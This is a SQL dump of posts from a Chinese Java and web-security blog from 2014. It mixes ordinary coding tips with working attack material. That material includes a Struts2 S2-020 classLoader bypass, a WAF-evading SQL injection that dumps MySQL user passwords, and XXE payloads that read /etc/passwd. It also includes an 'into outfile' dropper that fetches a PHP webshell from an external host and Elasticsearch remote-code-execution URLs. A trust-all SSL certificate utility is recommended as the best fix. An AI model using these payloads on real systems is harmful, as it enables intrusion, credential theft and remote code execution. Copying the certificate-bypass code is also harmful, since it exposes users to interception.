class=\"brush: java; gutter: true\">http://127.0.0.1/s/example/HelloWorld.action?class.classLoader.resources.dirContext.docBase=//192.168.x.x/test</pre>\n<p style=\"color: #737373;\"><span style=\"color: #000000;\"> 绕过方式是：</span></p>\n<pre class=\"brush: java; gutter: true\">http://localhost:8080/Struts2/test.action?class[&quot;classLoader&quot;][&quot;resources&quot;][&quot;dirContext&quot;][&quot;docBase&quot;]=xxxxx</pre>\n<p style=\"color: #737373;\"><span style=\"color: #000000;\">补充： </span><br style=\"color: #000000;\" /><span style=\"color: #000000;\">1、高版本需要用单引号\': </span><br style=\"color: #000000;\" /><span style=\"color: #000000;\">class[\'classLoader\'][\'resources\'][\'dirContext\'][\'docBase\'] </span><br style=\"color: #000000;\" /><span style=\"color: #000000;\">2、请勿随意尝试，漏洞利用代码会让对方网站挂掉 </span></p>\n<p style=\"color: #737373;\"><br style=\"color: #000000;\" /><span style=\"color: #000000;\">顺便说下// netbios协议似乎在仅是windows，linux下貌似不能直接使用这样的协议。之前有发过：</span><a style=\"color: #002e8c;\" href=\"http://sec.baidu.com/index.php?research/detail/id/18\" target=\"_blank\">[百度安全中心博客-neobyte]Struts2 S2-020在Tomcat 8下的命令执行分析</a><span style=\"color: #000000;\">利用切换日志到web目录，有点可行性。 </span><br style=\"color: #000000;\" /><span style=\"color: #000000;\">加速乐发了新闻： </span></p>\n<p style=\"color: #737373;\"><a href=\"http://jiasule.baidu.com/news/5357a1eebf9efd27e6ecbade/\">http://jiasule.baidu.com/news/5357a1eebf9efd27e6ecbade/</a><br style=\"color: #000000;\" /><span style=\"color: #000000;\">4月23日消息，近日安全研究人员指出Apache Struts2在漏洞公告S2-020里，在处理修复CVE-2014-0094的漏洞修补方案存在漏洞，导致补丁被完全绕过。目前官方在GitHub上对该问题做出了修正。该问题被曝光后，百度加速乐已率先升级了防御规则，目前百度加速乐可独家防御该漏洞。 </span><br style=\"color: #000000;\" /><br style=\"color: #000000;\" /><span style=\"color: #000000;\">据了解Struts2已不是第一次出现重大安全事故，去年9月Struts2曝出漏洞，国家多家重要政府网站受到影响，其中不乏部委级网站。此次再次曝出漏洞显现出互联网安全问题的严重性。</span></p>\n<p style=\"color: #737373;\">另外：</p>\n<pre class=\"brush: java; gutter: true\">class[&quot;classLoader&quot;][&quot;resources&quot;][&quot;dirContext&quot;][&quot;docBase&quot;]</pre>和\n<pre class=\"brush: java; gutter: true\">class[&#039;classLoader&#039;][&#039;resources&#039;][&#039;dirContext&#039;][&#039;docBase&#039;]</pre>\n效果是一样的哦。', null, '2014-04-23 21:23:15', '1', '531', null, '0', '2014-04-24 11:04:48'), ('1233', '1', '3', 'Java获取本地IP异常问题', '园长', '<p class=\"p1\">获取本地IP往往只需要：InetAddress.getLocalHost().getHostAddress()就行了，但是今天在测试的时候发现这个方法并不怎么靠谱。服务器配置有问题导致无法通过主机名获取IP地址从而抛出了一个UnknowHostException。临时的程序解决办法是假设getLocalHost异常则用NetworkInterface方法获取IP：</p>\n<pre class=\"brush: java; gutter: true\">public InetAddress getLocalHostLANAddress() throws UnknownHostException {\n	    try {\n	        InetAddress candidateAddress = null;\n	        for (Enumeration&lt;?&gt; ifaces = NetworkInterface.getNetworkInterfaces(); ifaces.hasMoreElements();) {\n	            NetworkInterface iface = (NetworkInterface) ifaces.nextElement();\n	            for (Enumeration&lt;?&gt; inetAddrs = iface.getInetAddresses(); inetAddrs.hasMoreElements();) {\n	                InetAddress inetAddr = (InetAddress) inetAddrs.nextElement();\n	                if (!inetAddr.isLoopbackAddress()) {\n	                    if (inetAddr.isSiteLocalAddress()) {\n	                        return inetAddr;\n	                    }\n	                    else if (candidateAddress == null) {\n	                        candidateAddress = inetAddr;\n	                    }\n	                }\n	            }\n	        }\n	        if (candidateAddress != null) {\n	            return candidateAddress;\n	        }\n	        InetAddress jdkSuppliedAddress = InetAddress.getLocalHost();\n	        if (jdkSuppliedAddress == null) {\n	            throw new UnknownHostException(&quot;The JDK InetAddress.getLocalHost() method unexpectedly returned null.&quot;);\n	        }\n	        return jdkSuppliedAddress;\n	    }\n	    catch (Exception e) {\n	        UnknownHostException unknownHostException = new UnknownHostException(&quot;Failed to determine LAN address: &quot; + e);\n	        unknownHostException.initCause(e);\n	        throw unknownHostException;\n	    }\n	}\n    public InetAddress getLocalHost(){\n    	InetAddress inetAddress = null;\n    	try {\n    		inetAddress = InetAddress.getLocalHost();\n		} catch (Exception e) {\n			try {\n				inetAddress = getLocalHostLANAddress();\n			} catch (UnknownHostException e1) {\n				ClientLogger.clog(e);\n			}\n		}\n    	return inetAddress;\n    }</pre>\n<p><p class=\"p1\"></p></p>', null, '2014-04-27 22:27:26', '1', '534', null, '3', '2014-04-27 22:27:26'), ('1237', '1', '3', 'Java 信任所有SSL证书(解决PKIX path building failed问题)', '园长', '<p class=\"p1\">Java在请求某些不受信任的https网站时会报：PKIX path building failed</p>\n<pre class=\"brush: java; gutter: true\">javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\n	at sun.security.ssl.Alerts.getSSLException(Alerts.java:192)\n	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1884)\n	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:276)\n	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:270)\n	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1341)\n	at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:153)\n	at sun.security.ssl.Handshaker.processLoop(Handshaker.java:868)\n	at sun.security.ssl.Handshaker.process_record(Handshaker.java:804)\n	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1016)\n	at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1312)\n	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1339)\n	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1323)\n	at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:563)\n	at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185)\n	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1300)\n	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getInputStream(HttpsURLConnectionImpl.java:254)\n	at SslTest.getRequest(SslTest.java:16)\n	at SslTest.main(SslTest.java:40)\nCaused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\n	at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:385)\n	at sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:230)\n	at sun.security.validator.Validator.validate(Validator.java:260)\n	at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:326)\n	at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:231)\n	at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:126)\n	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1323)\n	... 13 more\nCaused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\n	at sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:196)\n	at java.security.cert.CertPathBuilder.build(CertPathBuilder.java:268)\n	at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:380)\n	... 19 more</pre>\n<p><p class=\"p1\">解决办法：</p></p>\n<p><p class=\"p1\">1、导入证书到本地证书库</p></p>\n<p><p class=\"p1\">2、信任所有SSL证书</p></p>\n<p><p class=\"p1\">最好的解决办法或许是信任所有SSL证书，因为某些时候不能每次都手动的导入证书非常麻烦。现在封装了个方法，在连接openConnection的时候忽略掉证书就行了。</p></p>\n<pre class=\"brush: java; gutter: true\">SslUtils.ignoreSsl();</pre>\n<p class=\"p1\">SslUtils.java:</p>\n<pre class=\"brush: java; gutter: true\">import java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\npublic class SslUtils {\n	private static void trustAllHttpsCertificates() throws Exception {\n		TrustManager[] trustAllCerts = new TrustManager[1];\n		TrustManager tm = new miTM();\n		trustAllCerts[0] = tm;\n		SSLContext sc = SSLContext.getInstance(&quot;SSL&quot;);\n		sc.init(null, trustAllCerts, null);\n		HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n	}\n	static class miTM implements TrustManager,X509TrustManager {\n		public X509Certificate[] getAcceptedIssuers() {\n			return null;\n		}\n		public boolean isServerTrusted(X509Certificate[] certs) {\n			return true;\n		}\n		public boolean isClientTrusted(X509Certificate[] certs) {\n			return true;\n		}\n		public void checkServerTrusted(X509Certificate[] certs, String authType)\n				throws CertificateException {\n			return;\n		}\n		public void checkClientTrusted(X509Certificate[] certs, String authType)\n				throws CertificateException {\n			return;\n		}\n	}\n	/**\n	 * 忽略HTTPS请求的SSL证书，必须在openConnection之前调用\n	 * @throws Exception\n	 */\n	public static void ignoreSsl() throws Exception{\n		HostnameVerifier hv = new HostnameVerifier() {\n			public boolean verify(String urlHostName, SSLSession session) {\n				System.out.println(&quot;Warning: URL Host: &quot; + urlHostName + &quot; vs. &quot; + session.getPeerHost());\n				return true;\n			}\n		};\n		trustAllHttpsCertificates();\n		HttpsURLConnection.setDefaultHostnameVerifier(hv);\n	}\n}</pre>\n<p><p class=\"p1\">SslTest.java:</p></p>\n<pre class=\"brush: java; gutter: true\">import java.io.OutputStreamWriter;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport org.apache.commons.io.IOUtils;\npublic class SslTest {\n	public String getRequest(String url,int timeOut) throws Exception{\n		URL u = new URL(url);\n		if(&quot;https&quot;.equalsIgnoreCase(u.getProtocol())){\n			SslUtils.ignoreSsl();\n		}\n		URLConnection conn = u.openConnection();\n		conn.setConnectTimeout(timeOut);\n		conn.setReadTimeout(timeOut);\n		return IOUtils.toString(conn.getInputStream());\n	}\n	public String postRequest(String urlAddress,String args,int timeOut) throws Exception{\n		URL url = new URL(urlAddress);\n		if(&quot;https&quot;.equalsIgnoreCase(url.getProtocol())){\n			SslUtils.ignoreSsl();\n		}\n		URLConnection u = url.openConnection();\n		u.setDoInput(true);\n        u.setDoOutput(true);\n        u.setConnectTimeout(timeOut);\n        u.setReadTimeout(timeOut);\n        OutputStreamWriter osw = new OutputStreamWriter(u.getOutputStream(), &quot;UTF-8&quot;);\n        osw.write(args);\n        osw.flush();\n        osw.close();\n        u.getOutputStream();\n		return IOUtils.toString(u.getInputStream());\n	}\n	public static void main(String[] args) {\n		try {\n			SslTest st = new SslTest();\n			String a = st.getRequest(&quot;https://xxx.com/login.action&quot;, 3000);\n			System.out.println(a);\n		} catch (Exception e) {\n			e.printStackTrace();\n		}\n	}\n}</pre>', null, '2014-04-29 13:01:27', '1', '2120', null, '1', '2014-04-29 13:01:27'), ('1239', '1', '3', 'javaweb 获取请求文件绝对路径问题-getServletPath();', '园长', '在之前获取绝对路径用了WEB路径+RequestURI:<a href=\"http://javaweb.org/?p=711\">jsp获取真实或虚拟文件绝对路径</a>,发现这种做法麻烦而又不准确。当请求http://xxx.com/test/假设test下有index.jsp那么<span style=\"color: #000000;\">request.getRequestURI()是取不到index.jsp的请求的。这时候最好使用：</span>request.getServletPath()，此方法可以获取请求的servlet路径。\n<p><p class=\"p1\"><b>getServletPath</b></p></p>\n<p><p class=\"p2\">java.lang.String <b>getServletPath</b>()</p></p>\n<p><p class=\"p3\">Returns the part of this request\'s URL that calls the servlet. This path starts with a \"/\" character and includes either the servlet name or a path to the servlet, but does not include any extra path information or a query string. Same as the value of the CGI variable SCRIPT_NAME.</p></p>\n<p><p class=\"p3\">This method will return an empty string (\"\") if the servlet used to process this request was matched using the \"/*\" pattern.</p></p>\n<p><p class=\"p3\"><b>Returns:</b></p></p>\n<p><p class=\"p3\">a <span class=\"s1\">String</span> containing the name or path of the servlet being called, as specified in the request URL, decoded, or an empty string if the servlet used to process the request is matched using the \"/*\" pattern.</p></p>\n<p><p class=\"p3\">简单封装了下获取当前请求文件绝对路径方法：</p></p>\n<pre class=\"brush: java; gutter: true\">    /**\n     * 获取web目录,Weblogic 默认以war包部署的时候不能用getRealPath\n     * getResource(&quot;/&quot;)获取的是当前应用所在的类路径，截取到WEB-INF\n     * 之后的路径就是当前应用的web根目录了\n     * @param request\n     * @return\n     */\n    public String getDocumentRoot(HttpServletRequest request){\n    	String webRoot = request.getSession().getServletContext().getRealPath(&quot;/&quot;);\n    	if(webRoot == null){\n    		webRoot = this.getClass().getClassLoader().getResource(&quot;/&quot;).getPath();\n    		webRoot = webRoot.substring(0,webRoot.lastIndexOf(&quot;WEB-INF&quot;));\n    	}\n	    return webRoot;\n    }\n    /**\n     * 获取请求文件的绝对路径，getServletPath()更加准确。访问目录可以获取到具体的索引文件\n     * 如访问/test,test目录下存在index.jsp getServletPath()可获取到只有的请求文件URL\n     * @param request\n     * @return\n     */\n    public String getHttpRequestFileRealPath(HttpServletRequest request) {\n    	String documentRoot = getDocumentRoot(request)+&quot;/&quot;+request.getServletPath();\n        return documentRoot.replaceAll(&quot;\\\\\\\\&quot;, &quot;/&quot;).replaceAll(&quot;/+&quot;, &quot;/&quot;);\n    }</pre>', null, '2014-05-05 14:59:56', '1', '560', null, '1', '2014-05-05 15:25:01'), ('1251', '1', '3', 'S2-022 Struts\' internals manipulation via CookieInterceptor', '园长', 'http://struts.apache.org/release/2.3.x/docs/s2-022.html', null, '2014-05-06 12:48:32', '1', '521', null, '0', '2014-05-06 12:51:12'), ('1256', '1', '3', '安全狗POST SQL注入.', '园长', '不知为何不拦POST的/*!XXX*/\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/05/3.jpg\"><img class=\"alignnone size-full wp-image-1259\" src=\"http://javaweb.org/wp-content/uploads/2014/05/3.jpg\" alt=\"3\" width=\"849\" height=\"597\" /></a></p>\n<p>id=1 and 1=2 union select 1,user,password from mysql.user limit 0,1</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/05/1.jpg\"><img class=\"alignnone size-full wp-image-1257\" src=\"http://javaweb.org/wp-content/uploads/2014/05/1.jpg\" alt=\"1\" width=\"1125\" height=\"650\" /></a></p>\n<p>id=1200000  /*!union*//*!select*/(1),user,password from mysql.user limit 0,1</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/05/2.jpg\"><img class=\"alignnone size-full wp-image-1258\" src=\"http://javaweb.org/wp-content/uploads/2014/05/2.jpg\" alt=\"2\" width=\"699\" height=\"412\" /></a></p>\n<pre class=\"brush: php; gutter: true\">&lt;?php\n	$conn = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;);\n	mysql_select_db(&quot;test&quot;);\n	$sql = &quot;select * from user where id = &quot;.$_POST[&#039;id&#039;];\n	echo $sql.&quot;&lt;br/&gt;&quot;;\n	$result = mysql_query($sql,$conn);\n	while ( $data = mysql_fetch_array ( $result ) ) {\n		echo $data [&#039;id&#039;].&quot;---&quot;.$data [&#039;username&#039;].&quot;---&quot;.$data[&#039;password&#039;].&#039;&lt;br/&gt;&#039;;\n	}\n	mysql_close ( $conn );\n?&gt;</pre>', null, '2014-05-06 15:07:55', '1', '536', null, '2', '2014-05-06 15:12:31'), ('1263', '1', '15', 'java 反射运行时加载外部jar到Tomcat StandardClassLoader', '园长', '加载jar这一部分很容易，可是卸载jar就没那么容易了。加载jar的时候需要用反射去调用URLClassLoader的addURL方法。Tomcat的<span style=\"color: #000000;\">StandardClassLoader继承于</span>URLClassLoader。\n<pre class=\"brush: java; gutter: true\">&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot;%&gt;\n&lt;%@ page import=&quot;java.util.*&quot;%&gt;\n&lt;%@page import=&quot;java.net.URL&quot;%&gt;\n&lt;%@page import=&quot;java.lang.reflect.Method&quot;%&gt;\n&lt;%@page import=&quot;java.net.URLClassLoader&quot;%&gt;\n&lt;%\n	URLClassLoader c = (URLClassLoader) getClass().getClassLoader().getParent().getParent();\n	URL jar = new URL(&quot;http://javaweb.org/jars.jar&quot;);\n	try {\n		Method m = URLClassLoader.class.getDeclaredMethod(&quot;addURL&quot;, URL.class);\n		m.setAccessible(true);\n		m.invoke(c,new Object[]{jar});\n		URL[] url = c.getURLs();\n		for(URL u:url){\n			out.println(u+&quot;&lt;br/&gt;&quot;);\n		}\n		Class&lt;?&gt; test = Class.forName(&quot;com.javaweb.test.Test&quot;);\n		Method method = test.getDeclaredMethod(&quot;test&quot;,HttpServletRequest.class);\n   		Object obj = method.invoke(test.newInstance(), new Object[]{request});\n   		out.println(method.getName()+&quot;:&quot;+obj);\n	}catch(Exception e){\n		e.printStackTrace();\n	}\n%&gt;</pre>\n<pre class=\"brush: java; gutter: true\">jars.jar内容：</pre>\n<pre class=\"brush: java; gutter: true\">package com.javaweb.test;\nimport javax.servlet.http.HttpServletRequest;\npublic class Test{\n	public String test(HttpServletRequest request){\n		String str = request.getSession().getServletContext().getRealPath(&quot;/&quot;);\n		System.out.println(str);\n		return str;\n	}\n}</pre>\n<p>输出：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/05/11.jpg\"><img class=\"alignnone size-full wp-image-1264\" src=\"http://javaweb.org/wp-content/uploads/2014/05/11.jpg\" alt=\"1\" width=\"401\" height=\"525\" /></a></p>', null, '2014-05-08 11:00:03', '1', '692', null, '0', '2014-09-14 15:39:23'), ('1267', '1', '14', 'SQL 注入中的Insert、Update、Delete命令', '园长', '下载地址：<a href=\"http://pan.baidu.com/s/1i3JZ1a9\">SQL 注入中的Insert、Update、Delete命令</a>\n<p><a href=\"http://www.exploit-db.com/wp-content/themes/exploit/docs/33253.pdf\">SQL Injection in Insert, Update and Delete Statements</a></p>', null, '2014-05-09 10:40:50', '1', '542', null, '0', '2014-05-09 10:40:50'), ('1269', '1', '14', 'dom4j xml 格式化解析实体注入', '园长', '解析代码：\n<pre class=\"brush: java; gutter: true\">import java.io.StringReader;\nimport java.io.StringWriter;\nimport org.dom4j.Document;\nimport org.dom4j.io.OutputFormat;\nimport org.dom4j.io.SAXReader;\nimport org.dom4j.io.XMLWriter;\npublic class XmlFormat {\n	public static String format(String str)	throws Exception {\n		SAXReader reader = new SAXReader();\n		// System.out.println(reader);\n		// 注释：创建一个串的字符输入流\n		StringReader in = new StringReader(str);\n		Document doc = reader.read(in);\n		// System.out.println(doc.getRootElement());\n		// 注释：创建输出格式\n		OutputFormat formater = OutputFormat.createPrettyPrint();\n		//formater=OutputFormat.createCompactFormat();\n		// 注释：设置xml的输出编码\n		formater.setEncoding(&quot;utf-8&quot;);\n		// 注释：创建输出(目标)\n		StringWriter out = new StringWriter();\n		// 注释：创建输出流\n		XMLWriter writer = new XMLWriter(out, formater);\n		// 注释：输出格式化的串到目标中，执行后。格式化后的串保存在out中。\n		writer.write(doc);\n		writer.close();\n		System.out.println(out.toString());\n		// 注释：返回我们格式化后的结果\n		return out.toString();\n	}\n	public static void main(String[] args) throws Exception {\n		String str = &quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;UTF-8\\&quot;?&gt;&lt;!DOCTYPE test [&lt;!ELEMENT test ANY &gt;&lt;!ENTITY xxe SYSTEM \\&quot;file:///Users\\&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;&quot;;\n		format(str);\n	}\n}</pre>\n<p>列取/Users目录：</p>\n<pre class=\"brush: xml; gutter: true\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ELEMENT test ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///Users&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</pre>\n<a href=\"http://javaweb.org/wp-content/uploads/2014/05/12.jpg\"><img class=\"alignnone size-full wp-image-1271\" src=\"http://javaweb.org/wp-content/uploads/2014/05/12.jpg\" alt=\"1\" width=\"990\" height=\"661\" /></a>\n读文件：\n<pre class=\"brush: xml; gutter: true\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ELEMENT test ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</pre>\n<a href=\"http://javaweb.org/wp-content/uploads/2014/05/21.jpg\"><img class=\"alignnone size-full wp-image-1270\" src=\"http://javaweb.org/wp-content/uploads/2014/05/21.jpg\" alt=\"2\" width=\"1015\" height=\"265\" /></a>', null, '2014-05-09 10:51:27', '1', '621', null, '7', '2014-05-12 18:07:27'), ('1293', '1', '3', 'java.io.File.renameTo文件系统问题', '园长', 'java.io.File中的renameTo方法尽量少用，因为可能会出现文件系统不一致问题导致文件移动失败。具体可能出现的问题包括：1、NTFS、FAT32 分区格式问题。2、文件分隔符问题\\\\和/。3、rename的文件存在。\n<pre class=\"brush: java; gutter: true\">public boolean renameTo(File dest) {\n        SecurityManager security = System.getSecurityManager();\n        if (security != null) {\n            security.checkWrite(path);\n            security.checkWrite(dest.path);\n        }\n        if (dest == null) {\n            throw new NullPointerException();\n        }\n        if (this.isInvalid() || dest.isInvalid()) {\n            return false;\n        }\n        return fs.rename(this, dest);\n    }</pre>\n<p>具体的实现在你当前对应的文件系统，最终调用了本地的rename0方法：</p>\n<pre class=\"brush: java; gutter: true\">public boolean rename(File f1, File f2) {\n        // Keep canonicalization caches in sync after file deletion\n        // and renaming operations. Could be more clever than this\n        // (i.e., only remove/update affected entries) but probably\n        // not worth it since these entries expire after 30 seconds\n        // anyway.\n        cache.clear();\n        javaHomePrefixCache.clear();\n        return rename0(f1, f2);\n    }\n    private native boolean rename0(File f1, File f2);</pre>\n<p>推荐使用的方法：</p>\n<pre class=\"brush: java; gutter: true\">if(!destFile.exists()){\n      FileUtils.copyFile(file, destFile);\n      file.delete();\n}</pre>\n<p>参考：http://xiaoych.iteye.com/blog/149328</p>', null, '2014-05-20 12:31:11', '1', '559', null, '0', '2014-05-20 12:35:34'), ('1298', '1', '14', 'php shell', '园长', 'sql:\n<pre class=\"brush: sql; gutter: true\">select &#039;&lt;?php file_put_contents(dirname(__FILE__).&quot;/&quot;.$_GET[\\&#039;file\\&#039;], file_get_contents($_GET[\\&#039;url\\&#039;]));?&gt;&#039; into outfile&#039;/var/www/html/xxx/data/conf_ads.php&#039;</pre>\nGET:\nhttp://www.XXX.com.cn/data/conf_ads.php?file=admin3.php&amp;url=http://javaweb.org/1.txt\n1.txt:\n<pre class=\"brush: php; gutter: true\">&lt;?php\necho &quot;&lt;form action=\\&quot;\\&quot; method=\\&quot;post\\&quot; id=\\&quot;fm\\&quot;&gt;&quot;;\nfunction getFile($path,$charset) {\n     header(&quot;Content-Type:text/html;charset=&quot;.$charset);\n     if (is_dir($path)) {\n          $dir = opendir ( $path );\n          while ( $file = readdir ( $dir ) ) {\n               echo &quot;&lt;a href=\\&quot;javascript:get(&#039;&quot;.str_replace(&#039;\\\\&#039;,&#039;/&#039;,$path).&quot;/&quot;.$file.&quot;&#039;);\\&quot;&gt;&quot;.$file.&quot;&lt;/a&gt;&lt;br&gt;&quot;;\n          }\n          closedir($dir);\n     } else {\n          echo &quot;File:&lt;input type=\\&quot;text\\&quot; style=\\&quot;width:350px;\\&quot; name=\\&quot;file\\&quot; value=\\&quot;&quot;.$path.&quot;\\&quot; /&gt;\n          &lt;input type=\\&quot;button\\&quot; style=\\&quot;margin-left:20px;\\&quot; value=\\&quot;update\\&quot; onclick=\\&quot;update(&#039;update&#039;)\\&quot; /&gt;\n          &lt;input type=\\&quot;button\\&quot; style=\\&quot;margin-left:20px;\\&quot; value=\\&quot;delete\\&quot; onclick=\\&quot;update(&#039;delete&#039;)\\&quot; /&gt;\n          &lt;span id=\\&quot;result\\&quot;&gt;&lt;/span&gt;&lt;br/&gt;&quot;;\n          echo &quot;&lt;textarea style=\\&quot;width:600px;height:500px;\\&quot; name=\\&quot;data\\&quot;&gt;&quot;.htmlspecialchars(file_get_contents($path)).&quot;&lt;/textarea&gt;&quot;;\n     }\n     echo &quot;&lt;input type=\\&quot;hidden\\&quot; name=\\&quot;p\\&quot; id=\\&quot;p\\&quot; value=\\&quot;&quot;.$path.&quot;\\&quot;/&gt;&lt;input type=\\&quot;hidden\\&quot; name=\\&quot;action\\&quot; id=\\&quot;action\\&quot; value=\\&quot;get\\&quot; /&gt;&lt;/form&gt;&quot;;\n}\nfunction update($filename,$data){\n     file_put_contents($filename, $data);\n     echo &quot;&lt;script&gt;history.back(-1);alert(&#039;ok&#039;);&lt;/script&gt;&quot;;\n}\nif(&#039;update&#039;==$_POST[&#039;action&#039;]){\n     update($_POST[&#039;file&#039;],$_POST[&#039;data&#039;]);\n}else if(&#039;delete&#039;==$_POST[&#039;action&#039;]){\n     if(file_exists($_POST[&#039;file&#039;])){\n          unlink($_POST[&#039;file&#039;]);\n          echo &quot;&lt;script&gt;history.back(-1);alert(&#039;delete ok&#039;);&lt;/script&gt;&quot;;\n     }\n}else{\n     getFile($_POST[&#039;p&#039;]!=&#039;&#039;?$_POST[&#039;p&#039;]:$_SERVER[&#039;DOCUMENT_ROOT&#039;],$_POST[&#039;charset&#039;]!=&#039;&#039;?$_POST[&#039;charset&#039;]:&quot;UTF-8&quot;);\n}\n?&gt;\n&lt;script&gt;\nfunction get(p){\n     document.getElementById(&#039;p&#039;).value = p;\n     document.getElementById(&#039;action&#039;).value = &quot;get&quot;;\n     document.getElementById(&#039;fm&#039;).submit();\n}\nfunction update(act){\n     document.getElementById(&#039;action&#039;).value = act;\n     document.getElementById(&#039;fm&#039;).submit();\n}\n&lt;/script&gt;</pre>', null, '2014-05-22 15:27:55', '1', '520', null, '0', '2014-05-22 15:27:55'), ('1300', '1', '13', '[更新]Elasticsearch 代码执行漏洞利用工具', '园长', '更新地址：<a href=\"http://pan.baidu.com/s/1pJG0psB\">Elasticsearch_1.2.jar</a> 命令参数忘记编码了，导致不能执行多参数已修复了。修改了超时为10秒、异常情况直接输出页面源码。\n<pre class=\"brush: actionscript3; gutter: true\">1、ElasticSearch是一个基于Lucene构建的开源，分布式，RESTful搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。 \n2、Lucene是apache软件基金会4 jakarta项目组的一个子项目，是一个开放源代码的全文检索引擎工具包</pre>\n<p><span style=\"color: #000000;\">这个漏洞如果被利用可直接在服务器端执行任意的java代码，ElasticSearch基本都部署在大型集群环境中危害非常的大。</span></p>\n<pre class=\"brush: java; gutter: true\">查看状态：http://xxxx:9200/_status\n集群健康报告：http://xxxx:9200/_cluster/health\n集群节点信息：http://xxxx:9200/_nodes</pre>\n<p><img class=\"alignnone size-full wp-image-1301\" src=\"http://javaweb.org/wp-content/uploads/2014/05/14.jpg\" alt=\"1\" width=\"719\" height=\"533\" /></p>\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1sjPjA0X\">Elasticsearch_fat.jar</a></p>\n<p>相关：http://bouk.co/blog/elasticsearch-rce/、http://wooyun.org/bugs/wooyun-2014-061672</p>\n<p>家里交不起网费了，如果工具有bug利用下面的代码就没什么问题了。</p>\n<p>利用代码：</p>\n<pre class=\"brush: java; gutter: true\">http://xxx.com:9200/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}},%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;\\nimport%20java.io.*;\\nString%20str%20=%20\\%22\\%22;BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(\\%22ifconfig\\%22).getInputStream()));StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();%22}}}</pre>\n<pre class=\"brush: java; gutter: true\">http://xxx.com:9200/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}},%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;\\nimport%20java.io.*;\\nFile%20f%20=%20new%20File(\\%22/tmp/12.txt\\%22);if(f.exists()){\\%22exists\\%22.toString();}BufferedWriter%20bw%20=%20new%20BufferedWriter(new%20OutputStreamWriter(new%20FileOutputStream(f),\\%22UTF-8\\%22));bw.write(\\%221233\\%22);bw.flush();bw.close();if(f.exists()){\\%22success\\%22.toString();}%22}}}</pre>', null, '2014-05-22 21:11:24', '1', '741', null, '5', '2014-10-13 00:23:03'), ('1310', '1', '12', 'acat.jar 迷你WebServer自带菜刀java版', '园长', '下载：<a href=\"http://pan.baidu.com/s/1bnxmltH\">ACat-jdk1.5.jar</a>、<a href=\"http://pan.baidu.com/s/1c0GMXNi\">ACat-附数据库驱动-jdk1.5.jar</a>、 <a href=\"http://pan.baidu.com/s/1qWlqs8W\">ACat-jdk.1.7.jar</a>、<a href=\"http://pan.baidu.com/s/1dDtKo5F\">ACat-附数据库驱动.jar</a>\n<p>源码：<a 